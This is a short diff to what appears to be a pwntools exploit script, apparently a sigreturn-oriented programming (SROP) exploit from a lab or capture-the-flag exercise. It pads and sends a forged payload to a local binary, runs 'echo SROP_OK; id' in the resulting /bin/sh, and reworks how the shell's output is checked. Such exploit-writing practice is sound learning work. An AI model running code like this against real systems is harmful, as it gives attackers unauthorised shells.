@@ -28,6 +28,10 @@ payload  = payload.ljust(512, b'\x00')        # 7  fill the 512-byte read so our
 io = process(elf.path)
 io.send(payload)
 io.sendline(b'echo SROP_OK; id')              # 8
-io.recvuntil(b'SROP_OK')
-log.success('shell: %s', io.recvline().strip().decode())
+# The forged execve spawned /bin/sh. recvuntil() proves the SROP_OK marker was
+# really emitted by the shell; then grab the `id` line. (recvuntil consumes the
+# marker, so re-emit the captured bytes together with the uid line.)
+marker = io.recvuntil(b'SROP_OK').strip().decode()          # 9
+shell  = io.recvline_contains(b'uid=').strip().decode()
+log.success('%s shell: %s', marker, shell)
 io.close()
